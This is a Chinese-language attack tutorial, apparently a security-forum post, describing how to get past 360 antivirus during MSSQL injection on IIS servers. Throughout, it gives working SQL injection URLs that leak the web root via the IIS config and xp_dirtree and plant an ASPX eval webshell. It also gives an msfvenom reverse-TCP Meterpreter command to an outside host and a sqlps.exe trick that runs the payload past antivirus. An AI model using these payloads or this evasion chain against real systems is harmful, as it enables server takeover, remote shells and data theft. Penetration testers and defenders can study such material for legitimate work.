0x01 废话
=======

有时候mssql注入会碰到-os-shell执行不了命令的情况，有可能是因为权限不够不能开启xp\_cmdshell，还有可能就是杀软拦截了

常见的只有360会拦截，如果被拦截了就是下面这样的

![1.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b4d91dc5d8afb78a51bfd2b06926163c3a8925ad.png)

0x02 拦截原因
=========

这里用上x64dbg在CreateProcessA和CreateProcessW打上断点

MSSQL调用的CreateProcessW

![2.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-75047331dddc275031c97145738d9fcc5d73656c.png)

可以看到xp\_cmdshell是直接使用cmd /c来执行命令的

这拦截的原因和之前的php很相似

不过这里没有php那么高的操作空间

0x03 写webshell到网站根目录
====================

一般来说都是IIS+MSSQL的搭配，MSSQL可以用sp\_oacreate来执行一些读写功能，因为不调用cmd所以360不会拦截，前提是需要知道网站的根目录

如果权限够高可以直接将IIS配置文件404页面

首先要开启sp\_oacareate这个存储过程

```sql
exec sp_configure 'show advanced options', 1;RECONFIGURE
exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE
```

然后用sp\_oacreate创建scripting.filesystemobject对象调用copyfile这个方法来实现复制文件

```sql
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'C:\Windows\System32\inetsrv\config\applicationHost.config' ,'C:\inetpub\custerr\zh-CN\404.htm';
```

这里的配置文件是IIS7的，路径是固定的，404的路径也是固定的，只要权限够高就可以复制过来

当然如果是国外语言路径可能会变化

![3.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-0325da614edf87ec50c19662fc60efd1d3d46ea9.png)

```php
http://192.168.159.128/index.aspx?user_id=1;
exec sp_configure 'show advanced options', 1;RECONFIGURE;
exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;
declare @o int;
exec sp_oacreate 'scripting.filesystemobject', @o out;
exec sp_oamethod @o, 'copyfile',null,'C:\Windows\System32\inetsrv\config\applicationHost.config' ,'C:\inetpub\custerr\zh-CN\404.htm';
```

然后访问一个不存在的页面就可以找到网站根目录

![4.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d4efdba65738de07dbd9e23a96cef00196576456.png)

权限低的话可以用xp\_dirtree来找就是有点慢

```php
http://192.168.159.128/index.aspx?user_id=1;
CREATE TABLE tmp (dir varchar(8000),num int,num1 int);
insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1;
```

先创建一个tmp表然后将xp\_dirtree的结果输出到tmp中

![5.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-02e2771c3bc2e8dc6b729ab7fc7d83db720fb21b.png)

在网页中需要使用注入查表得到结果，如果直接查询可能会报错需要转换一下

```php
http://192.168.159.128/index.aspx?user_id=-1 union select null,null,(select top 1 convert(varchar(100),dir COLLATE Chinese_PRC_CI_AS) from FoundStone_Bank.dbo.tmp),null,null
```

![6.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b0a8d997e7ffb6320017bf3da79d1e1c9511d402.png)

MSSQL和MYSQL不同没有LIMIT需要用where来过滤不想要的结果

```php
http://192.168.159.128/index.aspx?user_id=-1 union select null,null,(select top 1 convert(varchar(100),dir COLLATE Chinese_PRC_CI_AS)  from FoundStone_Bank.dbo.tmp WHERE DIR not in (SELECT TOP 1 dir FROM FoundStone_Bank.dbo.tmp)),null,null
```

类似这样，前面的top 1不用改，where中的top 从0开始增长就可以，sqlmap也是同种方式

虽然xp\_dirtree的方法繁琐但是还是可以有效的找到绝对路径，要么网站和数据库不在同个地方这就办法了

```sql
select host_name();             //主机名
select @@servername;            //服务器名
//如果相同则代表数据库和web在同一台机器上面
```

得到根目录后用Scripting.FileSystemObject中CreateTextFile和WriteLine来实现写入webshell

注意有拦截的话上面肯定有360webshell要免杀

```php
http://192.168.159.128/index.aspx?user_id=1;
declare @f int,@g int
exec sp_oacreate 'Scripting.FileSystemObject',@f output
EXEC SP_OAMETHOD @f,'CreateTextFile',@f OUTPUT,'c:\inetpub\wwwroot\shell.aspx',1
EXEC sp_oamethod  @f,'WriteLine',null,'<%@ Page Language="Jscript"%><%var a = "un";var b = "safe";Response.Write(eval(Request.Item["z"],a%2Bb));%>'
```

拿到shell了基本是IIS的用户，这里本来可以直接通过juicypotato提权

但是360不知道从什么时候开始加上了CrteateProcesWithToken的hook就提权不了了

整理了一下想着mssql本来就是高权限的，只要想办法用mssql来执行木马就可以了

0x03 权限提升
=========

说明一下只有mssql2005是直接高权限，这次的测试环境搭建的时候使用管理员启动的mssql，所以mssql实际的权限取决于网站管理员

在护网中也有碰到过用administrator起mssql的网站管理员，所以下面的方法就是提供一种思路

在网上搜索了一下发现用wscript.shell可以不调用cmd执行程序

```sql
declare @o int;
exec sp_oacreate 'wscript.shell',@o out;
exec sp_oamethod @o,'run',null,'calc';
```

![7.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-0ceb1bf8da8ee319427be4d6d2025a1e84a68dea.png)

可以看到在sqlserver的进程中启动了计算器

但是上传上去的木马，运行了就会提示某某程序在入侵sqlserver不让运行

经过多次测试后发现

1. 在系统目录中无害的程序是不杀的，像calc，ipconfig，tasklist这些，哪怕复制到别的路径来也不拦截
2. 有数字签名的

像cmd，powershell啥的在系统目录中但是也被杀的死死的

还有一个关键点，有数字签名的程序创建的进程要是不可信还是会被拦截，只要检测到父进程是sqlserver就会杀的特别四

那么需要找一个有数字签名的，可以直接加载到内存中的程序就可以上线了

在mssql的目录中看到了sqlps.exe有点眼熟，找了一下发现最近有篇文章就是关于sqlps的

[https://mp.weixin.qq.com/s?\_\_biz=MzU1NDkwMzAyMg%3D%3D&amp;mid=2247491483&amp;idx=1&amp;sn=5c43d9377fb5729104665e00040c2f36&amp;scene=21&amp;ref=www.ctfiot.com#wechat\_redirect](https://mp.weixin.qq.com/s?__biz=MzU1NDkwMzAyMg%3D%3D&mid=2247491483&idx=1&sn=5c43d9377fb5729104665e00040c2f36&scene=21&ref=www.ctfiot.com#wechat_redirect)

可以说是一个功能不全的powershell吧，但是可以直接执行ps1脚本，这样就不会创建进程导致被杀软拦截

```php
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.130.4.204 LPORT=60001 -f psh-reflection > shell.ps1
```

这里要用msf生成的脚本，cs生成会出现问题执行不了

将生成的脚本上传到服务器，上传的的方法有很多，可以用远程下载，也可以像webshell一样写入

远程下载只需要将Certutil.exe重命名，然后放到别的目录就可以了

![8.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e2d69b3e422d0d098e35857269d51c2731008884.png)

```php
http://192.168.159.128/index.aspx?user_id=1;
declare @o int;
exec sp_oacreate 'wscript.shell',@o out;
exec sp_oamethod @o,'run',null,'sqlps -ExecutionPolicy bypass -File c:\windows\temp\shell.ps1';
```

这样就上线了，但是到这里还是不能执行命令的，因为本质还是sqlserver下的进程

需要用migrate注入到别的进程内就可以执行命令了

0x04 总结
=======

sqlps直接执行是会被360拦截的，但是由sqlserver创建后执行就不拦截了

mssql是可以直接修改注册表启动项的，当然sqlps修改注册表也是不会被拦截的，这可能就是有签名的强大吧

因为2008操作空间有点小，如果有.net4.0可以用dotnet，csi这些直接将恶意代码加载进内存

总的来说需要一个有数字签名的程序可以直接加载进内存，如果有数字签名的程序可以直接执行dll，要么存在dll劫持的漏洞，也可以达到上线的目的的